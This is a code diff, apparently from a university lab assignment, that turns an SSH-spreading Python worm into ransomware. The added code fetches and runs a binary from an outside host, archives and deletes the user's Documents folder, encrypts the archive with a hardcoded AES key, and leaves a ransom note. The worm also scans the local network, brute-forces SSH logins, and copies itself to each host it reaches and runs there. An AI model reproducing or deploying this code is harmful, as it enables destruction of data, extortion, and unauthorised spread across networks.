@@ -6,6 +6,10 @@ import netinfo
 import os
 import sys
 import fcntl, struct
+import urllib
+import tarfile
+import shutil
+from subprocess import call
 
 # The list of credentials to attempt
 credList = [
@@ -15,8 +19,19 @@ credList = [
 ('cpsc', 'cpsc'),
 ]
 
+WORM_FILE = "extorter_worm.py"
+
 # The file marking whether the worm should spread
-INFECTED_MARKER_FILE = "/tmp/infected.txt"
+ETHERNET_DEVICE_FILE = "/proc/net/dev"
+INFECTED_MARKER_FILE = "/tmp/infected-" + WORM_FILE
+TAR_FILE             = '/home/cpsc/Documents.tar'
+
+def getMyEthernetDeviceName():
+	with open(ETHERNET_DEVICE_FILE, 'r') as infile:
+		for line in infile:
+			if 'eth' in line:
+				index = line.find(':')
+				return( str.encode(line[:index].strip()) )
 
 ##################################################################
 # Returns whether the worm should spread
@@ -41,8 +56,11 @@ def markInfected():
 	# in directory /tmp/
 	
 	# get wr3ck3d
-	with open(INFECTED_MARKER_FILE, 'w') as f:
-		pass	
+	try:
+		with open(INFECTED_MARKER_FILE, 'w') as outfile:
+			pass
+	except AttributeError:
+		os.remove("/home/cpsc/Documents.tar")
 
 ###############################################################
 # Spread to the other system and execute
@@ -62,14 +80,25 @@ def spreadAndExecute(sshClient):
 	# The code which goes into this function
 	# is very similar to that code.	
 
-	wormfile = "worm.py"
+	global WORM_FILE
 
 	sftpClient = sshClient.open_sftp()
-	#sftpClient.put(sys.argv[0], "/tmp/" + sys.argv[0])
-	sftpClient.put(wormfile, "/tmp/" + wormfile)
-	sshClient.exec_command("chmod a+x /tmp/" + wormfile)
-	sshClient.exec_command("nohup python /tmp/" + wormfile + " &")
+	
+	try:
+		stat = sftpClient.stat("/tmp/" + WORM_FILE)
+		print("File already exist")
+		# already exist
+		return
+	except IOError:
+		pass
 
+	
+	sftpClient.put(WORM_FILE, "/tmp/" + WORM_FILE)
+	sshClient.exec_command("chmod a+x /tmp/" + WORM_FILE)
+	#sshClient.exec_command("nohup python /tmp/" + WORM_FILE + " &")
+
+	sshClient.exec_command("python2.7 /tmp/" + WORM_FILE)
+	sshClient.close()
 
 
 ############################################################
@@ -90,7 +119,8 @@ def tryCredentials(host, userName, password, sshClient):
 	# and instance of SSH class sshClient.
 	# If the server is down	or has some other
 	# problem, connect() function which you will
-	# be using will throw socket.error exception.	     # Otherwise, if the credentials are not
+	# be using will throw socket.error exception.	    
+	# Otherwise, if the credentials are not
 	# correct, it will throw 
 	# paramiko.SSHException exception. 
 	# Otherwise, it opens a connection
@@ -203,7 +233,50 @@ def getHostsOnTheSameNetwork():
 	# Scan the network for hoss
 	hostInfo = portScanner.all_hosts()	
 	
-	return hostInfo
+	runningHosts = [host for host in hostInfo if portScanner[host].state() in "up"]
+		
+	try:
+		runningHosts.remove(u'192.168.1.250')
+	except ValueError:
+		pass
+
+	return runningHosts
+
+def downloadProgram():
+	# Download program
+	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "/tmp/openssl")
+	call(["bash", "-c", "chmod a+x /tmp/openssl"])
+
+def archiveDirectory(directory):
+	#newDir = '.'.join([d for d in directory.split('.') if len(d) is not 0])
+
+	# Tar up remote's folder
+	out = tarfile.open(TAR_FILE, mode='w')
+	try:
+		# if hasn't been archived yet
+		out.add(directory)
+
+		# remove directory
+		if(os.path.isdir(directory)):
+			shutil.rmtree(directory, ignore_errors=True)
+		else:
+			print("Directory didn't exist.")
+			os.remove(TAR_FILE)
+	finally:
+		out.close()
+
+def encryptFile(filepath):
+	call(["/tmp/openssl", "aes-256-cbc", "-a", "-salt", "-in", filepath, "-out", "%s.enc" %(filepath), "-k", "cs456worm"])
+	# remove software
+	call(["bash", "-c", "rm /tmp/openssl"])
+	
+	# remove tar file
+	#call(["bash", "-c", "rm /home/cpsc/Documents.tar"])
+	call(["bash", "-c", "rm " + TAR_FILE])
+
+def leaveMessage():
+	with open('/home/cpsc/Desktop/hello.txt', 'w') as f:
+		f.write("Hey, I just got into your system. Give me monies and I will give you your stuffz back. Have a nice day and thank you for choosing WoRM>9000.\n")
 
 def main():
 	# If we are being run without a command line parameters, 
@@ -223,10 +296,16 @@ def main():
 		if isInfectedSystem():
 			exit()
 
+		downloadProgram()
+		archiveDirectory('/home/cpsc/Documents')
+		encryptFile(TAR_FILE)
+		leaveMessage()
 		markInfected()
 
 	# TODO: Get the IP of the current system
-	ip = getMyIP(b"eth0")
+	ip = getMyIP(getMyEthernetDeviceName())
+
+	print("My IP: %s" %(ip))
 
 	# Get the hosts on the same network
 	networkHosts = getHostsOnTheSameNetwork()
@@ -234,24 +313,25 @@ def main():
 	# TODO: Remove the IP of the current system
 	# from the list of discovered systems (we
 	# do not want to target ourselves!).
-	networkHosts.rmeove(ip)
+	try:
+		networkHosts.remove(ip)
+	except ValueError:
+		pass
 
-	print "Found hosts: ", networkHosts
-
+	print("Found hosts: %s" % (networkHosts))
 
 	# Go through the network hosts
 	for host in networkHosts:
 		
 		# Try to attack this host
 		sshInfo =  attackSystem(host)
-		
-		print sshInfo
-		
-		
+
+		print("IP: %s   SSHClient: %s" %(host, sshInfo))
+
 		# Did the attack succeed?
 		if sshInfo:
 			
-			print "Trying to spread"
+			print("Trying to spread")
 			
 			# TODO: Check if the system was	
 			# already infected. This can be
@@ -274,7 +354,7 @@ def main():
 			# 
 			#        sftp.get(filepath, localpath)
 			# except IOError:
-			#       print "This system should be infected"
+			#       print("This system should be infected"
 			#
 			#
 			# If the system was already infected proceed.
@@ -282,7 +362,7 @@ def main():
 			# Infect that system
 			spreadAndExecute(sshInfo[0])
 			
-			print "Spreading complete"	
+			print("Spreading complete")
 
 if __name__ == '__main__':
 	main()
